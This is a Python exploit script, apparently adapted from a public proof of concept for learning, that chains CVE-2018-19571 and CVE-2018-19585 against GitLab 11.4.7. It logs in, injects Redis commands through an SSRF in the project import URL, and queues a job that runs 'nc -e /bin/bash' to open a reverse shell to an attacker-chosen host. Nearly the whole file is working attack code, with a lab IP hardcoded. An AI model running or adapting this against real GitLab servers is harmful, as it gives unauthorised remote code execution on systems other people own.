#!/usr/bin/python3

# Script by @algafix
# Simplications and changes for learning purposes.

# Based on the version from: Sam Redmond, Tam Lai Yin
# https://github.com/ctrlsam/GitLab-11.4.7-RCE

# CVE: CVE-2018-19571 + CVE-2018-19585

from random import randint
import requests
import argparse
import re

########## GENERAL CONFIG ###########

parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE')
parser.add_argument('-u', help='GitLab Username/Email', required=True)
parser.add_argument('-p', help='Gitlab Password', required=True)
parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
parser.add_argument('-l', help='reverse shell ip', required=True)
parser.add_argument('-P', help='reverse shell port', required=True)
args = parser.parse_args()

user = args.u
pwd = args.p
url = args.g + ":5080"
local_ip = args.l
local_port = args.P

auth_token_regex = re.compile(r'name="authenticity_token" value="(.*)" />')
namespace_id_regex = re.compile(r'<input value="(.*)" type="hidden" name="project\[namespace_id\]"')

############## LOGIN ################

request = requests.Session()
url_login = url + '/users/sign_in'
login_page = request.get(url_login)

auth_token = re.findall(auth_token_regex, login_page.text)[0]

login_data = {
    'authenticity_token':   auth_token,
    'user[login]':          user,
    'user[password]':       pwd,
    'user[remember_me]':    0
}

login_post = request.post(url_login, data=login_data)

if login_post.status_code != 200:
    exit(f"Login general error: {url_login}")
elif "Invalid Login" in login_post.text:
    exit(f"Login error: {user} / {pwd}")

print("[+] Login successful.")

############ PROJECT CREATION AND EXPLOIT #########

url_project = url + '/projects'
url_new_project = 'http://10.10.10.220:5080/projects/new'
project_page = request.get(url_new_project)
project_name = "project" + str(randint(1000,9999))
namespace_id = re.findall(namespace_id_regex, project_page.text)[-1]

auth_token = re.findall(auth_token_regex, project_page.text)[-1]
auth_token = auth_token.replace('==', '%3D%3D')
auth_token = auth_token.replace('+', '%2B')

payload = f"nc -e /bin/bash {local_ip} {local_port}"

exploit_form = \
"""utf8=%E2%9C%93&authenticity_token=""" + auth_token + """&project%5Bimport_url%5D=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/

 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|"""+ payload +"""\\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
 
 exec

 exec

/ssrf.git&project%5Bci_cd_only%5D=false&project%5Bname%5D="""+ project_name +"""&project%5Bnamespace_id%5D="""+ namespace_id +"""&project%5Bpath%5D="""+ project_name +"""&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"""

project_post = request.post(url_project, data=exploit_form)

if project_post.status_code != 200:
    exit("Problem in the project creation.")

print("[+] Payload sent.")

